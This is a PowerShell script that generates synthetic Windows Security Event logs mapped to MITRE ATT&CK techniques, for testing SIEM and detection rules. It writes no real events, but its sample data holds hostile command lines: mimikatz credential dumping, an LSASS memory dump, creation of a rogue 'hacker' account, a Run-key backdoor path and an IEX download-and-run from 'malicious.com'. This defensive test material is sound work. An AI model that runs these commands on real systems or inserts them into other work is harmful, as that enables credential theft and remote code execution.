<#
.SYNOPSIS
    Generates synthetic Windows Security Event logs for testing SIEM, detection rules, and forensic analysis.

.DESCRIPTION
    This script creates realistic Windows Security Events that simulate various attack scenarios
    and normal system activity. It can generate events mapped to MITRE ATT&CK techniques, helping
    security teams test their detection capabilities without requiring actual malicious activity.

    The script generates events for:
    - Process creation (4688)
    - Logon events (4624, 4625)
    - Account management (4720, 4722, 4726)
    - Scheduled tasks (4698, 4702)
    - Network connections (5156)
    - Kerberos authentication (4768, 4769)
    - Registry modifications (4657)
    - File access (4663)
    - PowerShell execution (4104, 4103)

.PARAMETER Scenario
    Specifies the attack scenario to simulate:
    - CredentialDumping: LSASS access, credential theft
    - LateralMovement: RDP, SMB, Pass-the-Hash
    - PrivilegeEscalation: UAC bypass, token manipulation
    - Persistence: Scheduled tasks, account creation
    - Reconnaissance: Network and system discovery
    - All: Generate events for all scenarios

.PARAMETER EventCount
    Number of events to generate (default: 100)

.PARAMETER OutputPath
    Path where synthetic logs will be saved as JSON/CSV (default: .\SyntheticLogs)

.PARAMETER TimeSpan
    Time range over which to spread events in minutes (default: 60)

.PARAMETER IncludeNormalActivity
    If specified, includes normal benign events mixed with attack indicators

.PARAMETER ExportFormat
    Export format: JSON, CSV, or EVTX (default: JSON)

.EXAMPLE
    PS C:\> .\Generate-SyntheticLogs.ps1 -Scenario CredentialDumping -EventCount 50
    Generates 50 events related to credential dumping attacks

.EXAMPLE
    PS C:\> .\Generate-SyntheticLogs.ps1 -Scenario All -IncludeNormalActivity -ExportFormat CSV
    Generates comprehensive logs including normal activity and exports to CSV

.EXAMPLE
    PS C:\> .\Generate-SyntheticLogs.ps1 -Scenario LateralMovement -TimeSpan 120 -OutputPath C:\Logs
    Generates lateral movement events spread over 2 hours

.NOTES
    - This script generates synthetic data for testing purposes only
    - Events are NOT written to actual Windows Event Log
    - Use generated logs for testing SIEM rules, detection logic, and forensic training
    - Adjust parameters to match your testing environment
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [ValidateSet("CredentialDumping", "LateralMovement", "PrivilegeEscalation", "Persistence", "Reconnaissance", "DefenseEvasion", "All")]
    [string]$Scenario = "All",

    [Parameter(Mandatory=$false)]
    [int]$EventCount = 100,

    [Parameter(Mandatory=$false)]
    [string]$OutputPath = ".\SyntheticLogs",

    [Parameter(Mandatory=$false)]
    [int]$TimeSpan = 60,

    [Parameter(Mandatory=$false)]
    [switch]$IncludeNormalActivity,

    [Parameter(Mandatory=$false)]
    [ValidateSet("JSON", "CSV", "Both")]
    [string]$ExportFormat = "JSON"
)

# Ensure UTF-8 encoding for console and files
try { chcp 65001 > $null } catch {}
try { [Console]::OutputEncoding = [System.Text.Encoding]::UTF8 } catch {}
$OutputEncoding = [System.Text.Encoding]::UTF8

# Initialize
$script:GeneratedEvents = @()
$startTime = (Get-Date).AddMinutes(-$TimeSpan)

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "Synthetic Windows Event Log Generator" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

Write-Host "Configuration:" -ForegroundColor Yellow
Write-Host "  Scenario: $Scenario" -ForegroundColor Gray
Write-Host "  Event Count: $EventCount" -ForegroundColor Gray
Write-Host "  Time Span: $TimeSpan minutes" -ForegroundColor Gray
Write-Host "  Output Path: $OutputPath" -ForegroundColor Gray
Write-Host "  Include Normal Activity: $IncludeNormalActivity`n" -ForegroundColor Gray

# Create output directory
if (-not (Test-Path $OutputPath)) {
    New-Item -Path $OutputPath -ItemType Directory -Force | Out-Null
}

#region Helper Functions

function New-SyntheticEvent {
    param(
        [int]$EventID,
        [string]$EventType,
        [hashtable]$EventData,
        [string]$MitreTechnique = "",
        [string]$Description = "",
        [bool]$Suspicious = $false
    )

    $timestamp = $startTime.AddMinutes((Get-Random -Minimum 0 -Maximum $TimeSpan))

    return [PSCustomObject]@{
        TimeCreated = $timestamp.ToString("yyyy-MM-dd HH:mm:ss")
        EventID = $EventID
        EventType = $EventType
        ComputerName = "DESKTOP-" + -join ((65..90) | Get-Random -Count 6 | ForEach-Object {[char]$_})
        Suspicious = $Suspicious
        MitreTechnique = $MitreTechnique
        Description = $Description
        EventData = $EventData
    }
}

function Get-RandomUser {
    $users = @("john.doe", "jane.smith", "admin", "bob.jones", "alice.williams", "system.admin", "helpdesk")
    return $users | Get-Random
}

function Get-RandomIP {
    return "10.$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 0 -Maximum 255)).$((Get-Random -Minimum 1 -Maximum 254))"
}

function Get-RandomProcess {
    param([bool]$Suspicious = $false)

    if ($Suspicious) {
        $processes = @(
            @{Name="powershell.exe"; Args="-enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="},
            @{Name="cmd.exe"; Args="/c whoami && net user"},
            @{Name="mimikatz.exe"; Args="sekurlsa::logonpasswords"},
            @{Name="procdump.exe"; Args="-ma lsass.exe lsass.dmp"},
            @{Name="net.exe"; Args="user hacker P@ssw0rd /add"},
            @{Name="rundll32.exe"; Args="C:\temp\evil.dll,EntryPoint"},
            @{Name="wmic.exe"; Args="process call create cmd.exe"}
        )
    } else {
        $processes = @(
            @{Name="explorer.exe"; Args=""},
            @{Name="chrome.exe"; Args="--type=renderer"},
            @{Name="outlook.exe"; Args=""},
            @{Name="teams.exe"; Args=""},
            @{Name="notepad.exe"; Args="document.txt"},
            @{Name="calc.exe"; Args=""},
            @{Name="powershell.exe"; Args="Get-Date"}
        )
    }

    return $processes | Get-Random
}

#endregion

#region Event Generators

function Generate-ProcessCreationEvents {
    param([int]$Count, [bool]$Suspicious = $false)

    Write-Host "[*] Generating Process Creation Events (4688)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $process = Get-RandomProcess -Suspicious $Suspicious
        $user = Get-RandomUser

        $eventData = @{
            SubjectUserName = $user
            SubjectDomainName = "CORP"
            NewProcessName = "C:\Windows\System32\$($process.Name)"
            CommandLine = $process.Args
            ProcessId = Get-Random -Minimum 1000 -Maximum 9999
            ParentProcessName = "C:\Windows\System32\explorer.exe"
        }

        $mitre = if ($Suspicious) {
            switch ($process.Name) {
                "mimikatz.exe" { "T1003.001" }
                "procdump.exe" { "T1003.001" }
                "net.exe" { "T1136.001" }
                "powershell.exe" { "T1059.001" }
                "wmic.exe" { "T1047" }
                default { "T1059" }
            }
        } else { "" }

        $event = New-SyntheticEvent -EventID 4688 -EventType "Process Creation" -EventData $eventData `
            -MitreTechnique $mitre -Description "A new process has been created" -Suspicious $Suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-LogonEvents {
    param([int]$Count, [bool]$IncludeFailures = $true)

    Write-Host "[*] Generating Logon Events (4624, 4625)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $isFailure = $IncludeFailures -and ((Get-Random -Minimum 0 -Maximum 100) -lt 20)
        $eventID = if ($isFailure) { 4625 } else { 4624 }
        $logonType = Get-Random -Minimum 2 -Maximum 11

        $eventData = @{
            TargetUserName = Get-RandomUser
            TargetDomainName = "CORP"
            LogonType = $logonType
            IpAddress = Get-RandomIP
            WorkstationName = "WORKSTATION-" + (Get-Random -Minimum 1 -Maximum 999)
            LogonProcessName = "User32"
            AuthenticationPackageName = if ($logonType -eq 3) { "NTLM" } else { "Kerberos" }
        }

        $suspicious = $isFailure -and ($i % 5 -eq 0)  # Multiple failures
        $mitre = if ($suspicious) { "T1110" } elseif ($logonType -eq 10) { "T1021.001" } else { "T1078" }

        $desc = if ($isFailure) { "An account failed to log on" } else { "An account was successfully logged on" }
        $event = New-SyntheticEvent -EventID $eventID -EventType "Logon" -EventData $eventData `
            -MitreTechnique $mitre -Description $desc -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-AccountManagementEvents {
    param([int]$Count)

    Write-Host "[*] Generating Account Management Events (4720, 4722, 4726)..." -ForegroundColor Cyan

    $eventTypes = @(
        @{ID=4720; Type="User Created"; Mitre="T1136.001"; Suspicious=$true},
        @{ID=4722; Type="User Enabled"; Mitre="T1098"; Suspicious=$false},
        @{ID=4726; Type="User Deleted"; Mitre="T1531"; Suspicious=$false}
    )

    for ($i = 0; $i -lt $Count; $i++) {
        $eventType = $eventTypes | Get-Random

        $eventData = @{
            TargetUserName = "user_" + (Get-Random -Minimum 1000 -Maximum 9999)
            TargetDomainName = "CORP"
            SubjectUserName = Get-RandomUser
            SubjectDomainName = "CORP"
        }

        $event = New-SyntheticEvent -EventID $eventType.ID -EventType $eventType.Type -EventData $eventData `
            -MitreTechnique $eventType.Mitre -Description $eventType.Type -Suspicious $eventType.Suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-ScheduledTaskEvents {
    param([int]$Count)

    Write-Host "[*] Generating Scheduled Task Events (4698, 4702)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $eventID = if ((Get-Random -Minimum 0 -Maximum 100) -lt 70) { 4698 } else { 4702 }
        $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 30

        $taskName = if ($suspicious) {
            "Windows" + (Get-Random -Minimum 1 -Maximum 999)  # Masquerading
        } else {
            "Backup_Task_" + (Get-Random -Minimum 1 -Maximum 999)
        }

        $eventData = @{
            TaskName = "\Microsoft\Windows\$taskName"
            SubjectUserName = Get-RandomUser
            SubjectDomainName = "CORP"
            TaskContent = if ($suspicious) {
                "<Command>powershell.exe</Command><Arguments>-enc JABzAD0ATgBlAHcALQBPAGIA</Arguments>"
            } else {
                "<Command>backup.exe</Command><Arguments>/full</Arguments>"
            }
        }

        $desc = if ($eventID -eq 4698) { "A scheduled task was created" } else { "A scheduled task was updated" }
        $event = New-SyntheticEvent -EventID $eventID -EventType "Scheduled Task" -EventData $eventData `
            -MitreTechnique "T1053.005" -Description $desc -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-KerberosEvents {
    param([int]$Count)

    Write-Host "[*] Generating Kerberos Events (4768, 4769, 4771)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $eventTypes = @(
            @{ID=4768; Type="TGT Request"; Mitre="T1558.001"},
            @{ID=4769; Type="Service Ticket"; Mitre="T1558.003"},
            @{ID=4771; Type="Pre-auth Failed"; Mitre="T1558.004"}
        )

        $eventType = $eventTypes | Get-Random
        $suspicious = ($eventType.ID -eq 4769 -and (Get-Random -Minimum 0 -Maximum 100) -lt 20) -or
                     ($eventType.ID -eq 4771)

        $eventData = @{
            TargetUserName = Get-RandomUser
            ServiceName = if ($eventType.ID -eq 4769) { "krbtgt/CORP.LOCAL" } else { "" }
            IpAddress = Get-RandomIP
            TicketEncryptionType = if ($suspicious) { "0x17" } else { "0x12" }  # RC4 vs AES
        }

        $event = New-SyntheticEvent -EventID $eventType.ID -EventType $eventType.Type -EventData $eventData `
            -MitreTechnique $eventType.Mitre -Description $eventType.Type -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-NetworkConnectionEvents {
    param([int]$Count)

    Write-Host "[*] Generating Network Connection Events (5156)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 25

        $eventData = @{
            Application = if ($suspicious) {
                "C:\Windows\System32\powershell.exe"
            } else {
                "C:\Program Files\Google\Chrome\chrome.exe"
            }
            SourceAddress = Get-RandomIP
            SourcePort = Get-Random -Minimum 49152 -Maximum 65535
            DestAddress = if ($suspicious) {
                "185.220.101." + (Get-Random -Minimum 1 -Maximum 254)  # Suspicious IP range
            } else {
                "142.250.80." + (Get-Random -Minimum 1 -Maximum 254)  # Google IPs
            }
            DestPort = if ($suspicious) {
                Get-Random -Minimum 4444 -Maximum 4446  # Common C2 ports
            } else {
                443
            }
            Protocol = 6  # TCP
        }

        $event = New-SyntheticEvent -EventID 5156 -EventType "Network Connection" -EventData $eventData `
            -MitreTechnique "T1071" -Description "The Windows Filtering Platform has permitted a connection" -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-FileAccessEvents {
    param([int]$Count)

    Write-Host "[*] Generating File Access Events (4663)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 30

        $eventData = @{
            SubjectUserName = Get-RandomUser
            SubjectDomainName = "CORP"
            ObjectName = if ($suspicious) {
                "C:\Windows\System32\config\SAM"
            } else {
                "C:\Users\$((Get-RandomUser))\Documents\file.docx"
            }
            ProcessName = "C:\Windows\System32\notepad.exe"
            AccessMask = "0x1"
        }

        $mitre = if ($suspicious) { "T1003.002" } else { "T1005" }
        $event = New-SyntheticEvent -EventID 4663 -EventType "File Access" -EventData $eventData `
            -MitreTechnique $mitre -Description "An attempt was made to access an object" -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-RegistryEvents {
    param([int]$Count)

    Write-Host "[*] Generating Registry Events (4657)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 35

        $eventData = @{
            SubjectUserName = Get-RandomUser
            SubjectDomainName = "CORP"
            ObjectName = if ($suspicious) {
                "\REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Backdoor"
            } else {
                "\REGISTRY\USER\S-1-5-21-123456789-1234567890-123456789-1001\Software\Microsoft\Windows\CurrentVersion\Explorer"
            }
            ProcessName = "C:\Windows\System32\reg.exe"
            OperationType = "%%1904"  # Value set
        }

        $mitre = if ($suspicious) { "T1547.001" } else { "T1112" }
        $event = New-SyntheticEvent -EventID 4657 -EventType "Registry Modification" -EventData $eventData `
            -MitreTechnique $mitre -Description "A registry value was modified" -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

function Generate-PowerShellEvents {
    param([int]$Count)

    Write-Host "[*] Generating PowerShell Events (4103, 4104)..." -ForegroundColor Cyan

    for ($i = 0; $i -lt $Count; $i++) {
        $eventID = if ((Get-Random -Minimum 0 -Maximum 100) -lt 60) { 4104 } else { 4103 }
        $suspicious = (Get-Random -Minimum 0 -Maximum 100) -lt 40

        $eventData = @{
            ContextInfo = "Severity = Informational, Host = ConsoleHost"
            UserData = Get-RandomUser
            ScriptBlockText = if ($suspicious) {
                "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            } else {
                "Get-ChildItem C:\Users\Documents"
            }
        }

        $mitre = if ($suspicious) { "T1059.001" } else { "" }
        $desc = if ($eventID -eq 4104) { "PowerShell script block logging" } else { "Module logging" }
        $event = New-SyntheticEvent -EventID $eventID -EventType "PowerShell" -EventData $eventData `
            -MitreTechnique $mitre -Description $desc -Suspicious $suspicious

        $script:GeneratedEvents += $event
    }
}

#endregion

#region Scenario Execution

$scenariosToRun = if ($Scenario -eq "All") {
    @("CredentialDumping", "LateralMovement", "PrivilegeEscalation", "Persistence", "Reconnaissance", "DefenseEvasion")
} else {
    @($Scenario)
}

foreach ($sc in $scenariosToRun) {
    Write-Host "`nGenerating events for scenario: $sc" -ForegroundColor Yellow

    switch ($sc) {
        "CredentialDumping" {
            Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.15)) -Suspicious $true
            Generate-FileAccessEvents -Count ([math]::Floor($EventCount * 0.10))
            Generate-KerberosEvents -Count ([math]::Floor($EventCount * 0.10))
        }
        "LateralMovement" {
            Generate-LogonEvents -Count ([math]::Floor($EventCount * 0.20))
            Generate-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.15))
            Generate-FileAccessEvents -Count ([math]::Floor($EventCount * 0.10))
        }
        "PrivilegeEscalation" {
            Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.15)) -Suspicious $true
            Generate-AccountManagementEvents -Count ([math]::Floor($EventCount * 0.10))
        }
        "Persistence" {
            Generate-ScheduledTaskEvents -Count ([math]::Floor($EventCount * 0.15))
            Generate-AccountManagementEvents -Count ([math]::Floor($EventCount * 0.10))
            Generate-RegistryEvents -Count ([math]::Floor($EventCount * 0.10))
        }
        "Reconnaissance" {
            Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.20)) -Suspicious $false
            Generate-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.10))
        }
        "DefenseEvasion" {
            Generate-RegistryEvents -Count ([math]::Floor($EventCount * 0.15))
            Generate-PowerShellEvents -Count ([math]::Floor($EventCount * 0.15))
        }
    }
}

# Add normal activity if requested
if ($IncludeNormalActivity) {
    Write-Host "`nGenerating normal activity events..." -ForegroundColor Yellow
    Generate-ProcessCreationEvents -Count ([math]::Floor($EventCount * 0.30)) -Suspicious $false
    Generate-LogonEvents -Count ([math]::Floor($EventCount * 0.20)) -IncludeFailures $false
    Generate-NetworkConnectionEvents -Count ([math]::Floor($EventCount * 0.20))
}

#endregion

#region Export

Write-Host "`nExporting generated events..." -ForegroundColor Yellow

$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

if ($ExportFormat -eq "JSON" -or $ExportFormat -eq "Both") {
    $jsonFile = Join-Path $OutputPath "SyntheticEvents_$timestamp.json"
    $script:GeneratedEvents | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
    Write-Host "  [+] JSON exported to: $jsonFile" -ForegroundColor Green
}

if ($ExportFormat -eq "CSV" -or $ExportFormat -eq "Both") {
    $csvFile = Join-Path $OutputPath "SyntheticEvents_$timestamp.csv"
    $script:GeneratedEvents | Export-Csv -Path $csvFile -NoTypeInformation -Encoding UTF8
    Write-Host "  [+] CSV exported to: $csvFile" -ForegroundColor Green
}

# Generate summary report
$summaryFile = Join-Path $OutputPath "Summary_$timestamp.txt"
$summary = @"
Synthetic Event Generation Summary
==================================

Generation Time: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
Scenario: $Scenario
Total Events: $($script:GeneratedEvents.Count)
Time Span: $TimeSpan minutes
Include Normal Activity: $IncludeNormalActivity

Event Breakdown:
----------------
"@

$eventBreakdown = $script:GeneratedEvents | Group-Object EventID | Sort-Object Count -Descending
foreach ($group in $eventBreakdown) {
    $summary += "`nEvent ID $($group.Name): $($group.Count) events"
}

$suspiciousCount = ($script:GeneratedEvents | Where-Object { $_.Suspicious }).Count
$summary += "`n`nSuspicious Events: $suspiciousCount ($([math]::Round(($suspiciousCount / $script:GeneratedEvents.Count) * 100, 2))%)"

$mitreTechniques = $script:GeneratedEvents | Where-Object { $_.MitreTechnique } | Select-Object -ExpandProperty MitreTechnique -Unique
$summary += "`n`nMITRE ATT&CK Techniques Covered:"
foreach ($technique in $mitreTechniques) {
    $summary += "`n  - $technique"
}

$summary | Out-File -FilePath $summaryFile -Encoding UTF8
Write-Host "  [+] Summary exported to: $summaryFile" -ForegroundColor Green

#endregion

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "Event Generation Complete" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Total Events Generated: $($script:GeneratedEvents.Count)" -ForegroundColor Green
Write-Host "Suspicious Events: $suspiciousCount" -ForegroundColor Yellow
Write-Host "Output Location: $OutputPath`n" -ForegroundColor Cyan
